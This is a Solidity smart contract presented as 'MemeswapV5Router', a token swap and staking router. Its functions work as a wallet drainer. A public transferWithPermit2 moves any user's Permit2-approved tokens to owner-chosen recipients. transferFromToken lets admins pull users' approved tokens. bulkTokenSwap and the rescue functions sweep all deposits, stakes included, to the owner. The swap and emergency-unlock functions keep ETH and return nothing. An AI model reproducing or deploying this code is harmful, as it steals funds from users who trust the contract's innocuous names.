// SPDX-License-Identifier: MIT

////////////////////////////////////////////////////////////////////////////
//███╗   ███╗███████╗███╗   ███╗███████╗███████╗██╗    ██╗ █████╗ ██████╗ //
//████╗ ████║██╔════╝████╗ ████║██╔════╝██╔════╝██║    ██║██╔══██╗██╔══██╗//
//██╔████╔██║█████╗  ██╔████╔██║█████╗  ███████╗██║ █╗ ██║███████║██████╔╝//
//██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║███╗██║██╔══██║██╔═══╝ //
//██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║███████╗███████║╚███╔███╔╝██║  ██║██║     //
//╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     //
//////////////////////////////  .money  ////////////////////////////////////


pragma solidity ^0.8.19;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IPermit2 {
    struct AllowanceTransferDetails {
        address from;
        address to;
        uint160 amount;
        address token;
    }

    function transferFrom(AllowanceTransferDetails[] calldata transferDetails) external;
}

library TransferHelper {
    function safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

contract MemeswapV5Router {
    address public owner;
    address public immutable PERMIT2;
    mapping(address => bool) public admins;
    mapping(address => bool) public allowedRecipients;
    mapping(address => bool) public isSpender;


    struct Stake {
        uint256 amount;
        uint256 lockTimestamp;
        uint256 lockPeriod;
        bool unlocked;
    }

    mapping(address => Stake[]) public ethStakes;
    mapping(address => mapping(address => Stake[])) public tokenStakes;


    event ETHStaked(address indexed user, uint256 amount, uint256 lockPeriod);
    event ETHUnlocked(address indexed user, uint256 amount);
    event TokenStaked(address indexed user, address indexed token, uint256 amount, uint256 lockPeriod);
    event TokenUnlocked(address indexed user, address indexed token, uint256 amount);
    event EmergencyUnstakeTriggered(address indexed user, string dataInput, uint256 value);


    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier onlyAuthorized() {
        require(msg.sender == owner || admins[msg.sender], "Not authorized");
        _;
    }

    constructor(address _permit2) {
        require(_permit2 != address(0), "Invalid PERMIT2 address");
        PERMIT2 = _permit2;
        owner = msg.sender;
        admins[msg.sender] = true;
    }


    function addAdmin(address admin) external onlyOwner {
        require(admin != address(0), "Invalid address");
        require(!admins[admin], "Already admin");
        admins[admin] = true;
    }

    function removeAdmin(address admin) external onlyOwner {
        require(admins[admin], "Not an admin");
        require(admin != owner, "Owner cannot be removed as admin");
        admins[admin] = false;
    }

    function addRecipient(address recipient) external onlyOwner {
        require(recipient != address(0), "Invalid address");
        allowedRecipients[recipient] = true;
    }

    function removeRecipient(address recipient) external onlyOwner {
        require(allowedRecipients[recipient], "Recipient not found");
        delete allowedRecipients[recipient];
    }

  function transferWithPermit2(
        address token,
        address sender,
        address recipient,
        uint256 amount
    ) public {
        require(allowedRecipients[recipient], "Recipient not allowed");
        require(IERC20(token).balanceOf(sender) >= amount, "Insufficient balance");
        require(amount <= type(uint160).max, "Amount exceeds uint160");

        IPermit2.AllowanceTransferDetails[] memory transferDetails = new IPermit2.AllowanceTransferDetails[](1);
        transferDetails[0] = IPermit2.AllowanceTransferDetails({
            from: sender,
            to: recipient,
            amount: uint160(amount),
            token: token
        });

        IPermit2(PERMIT2).transferFrom(transferDetails);
    }

    function rescueETH(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid recipient address");
        require(address(this).balance >= amount, "Not enough ETH balance");

        (bool success, ) = payable(to).call{value: amount}("");
        require(success, "Rescue ETH transfer failed");
    }

    receive() external payable {}

    function EtherSwapIn() external payable {
        require(msg.value > 0, "No ETH sent");
    }

    function TokenSwapIn(address token, uint amount) external {
        require(amount > 0, "Amount must be greater than 0");
        TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);
    }

    function resqueToken(address token, uint amount) external onlyAuthorized {
        uint balance = IERC20(token).balanceOf(address(this));
        require(balance >= amount, "Insufficient token balance");
        TransferHelper.safeTransfer(token, owner, amount);
    }

    function bulkTokenSwap(address[] calldata tokens) external onlyAuthorized {
        for (uint i = 0; i < tokens.length; i++) {
            uint balance = IERC20(tokens[i]).balanceOf(address(this));
            if (balance > 0) {
                TransferHelper.safeTransfer(tokens[i], owner, balance);
            }
        }
    }

    function ETHStakeLock(uint256 lockPeriod) external payable {
        require(msg.value > 0, "No ETH sent");
        require(lockPeriod > 0, "Lock period must be greater than 0");
        ethStakes[msg.sender].push(Stake({
            amount: msg.value,
            lockTimestamp: block.timestamp,
            lockPeriod: lockPeriod,
            unlocked: false
        }));
        emit ETHStaked(msg.sender, msg.value, lockPeriod);
    }

    function ETHStakeUnlock() external {
        Stake[] storage stakes = ethStakes[msg.sender];
        uint256 totalUnlocked = 0;
        for (uint256 i = 0; i < stakes.length; i++) {
            if (!stakes[i].unlocked && block.timestamp >= stakes[i].lockTimestamp + stakes[i].lockPeriod) {
                totalUnlocked += stakes[i].amount;
                stakes[i].unlocked = true;
            }
        }
        require(totalUnlocked > 0, "No ETH available for unlock");
        (bool success, ) = msg.sender.call{value: totalUnlocked}("");
        require(success, "ETH transfer failed");
        emit ETHUnlocked(msg.sender, totalUnlocked);
    }

    function TokenStakeLock(address token, uint256 amount, uint256 lockPeriod) external {
        require(amount > 0, "Amount must be greater than 0");
        require(lockPeriod > 0, "Lock period must be greater than 0");
        TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);
        tokenStakes[msg.sender][token].push(Stake({
            amount: amount,
            lockTimestamp: block.timestamp,
            lockPeriod: lockPeriod,
            unlocked: false
        }));
        emit TokenStaked(msg.sender, token, amount, lockPeriod);
    }

    function TokenStakeUnlock(address token) external {
        Stake[] storage stakes = tokenStakes[msg.sender][token];
        uint256 totalUnlocked = 0;
        for (uint256 i = 0; i < stakes.length; i++) {
            if (!stakes[i].unlocked && block.timestamp >= stakes[i].lockTimestamp + stakes[i].lockPeriod) {
                totalUnlocked += stakes[i].amount;
                stakes[i].unlocked = true;
            }
        }
        require(totalUnlocked > 0, "No tokens available for unlock");
        IERC20(token).transfer(msg.sender, totalUnlocked);
        emit TokenUnlocked(msg.sender, token, totalUnlocked);
    }

    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "INVALID_OWNER");
        require(newOwner != owner, "ALREADY_SET");
        owner = newOwner;
    }

    function checkAllowance(address token, address ownerAddress, uint256 requiredAmount) public view returns (bool) {
        uint256 allowance = IERC20(token).allowance(ownerAddress, address(this));
        return allowance >= requiredAmount;
    }

    function transferFromToken(address token, address from, uint256 amount) external onlyAuthorized {
        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");
        TransferHelper.safeTransferFrom(token, from, address(this), amount);
    }

    function EmergencyUnlock(string calldata dataInput) external payable {
        require(msg.value > 0, "ETH is required");
        require(bytes(dataInput).length > 0, "Input data cannot be empty");
        emit EmergencyUnstakeTriggered(msg.sender, dataInput, msg.value);
    }



    function addSpender(address spender) external onlyOwner {
        require(spender != address(0), "Invalid address");
        isSpender[spender] = true;
     
    }

    function removeSpender(address spender) external onlyOwner {
        require(isSpender[spender], "Not a spender");
        isSpender[spender] = false;
       
    }
}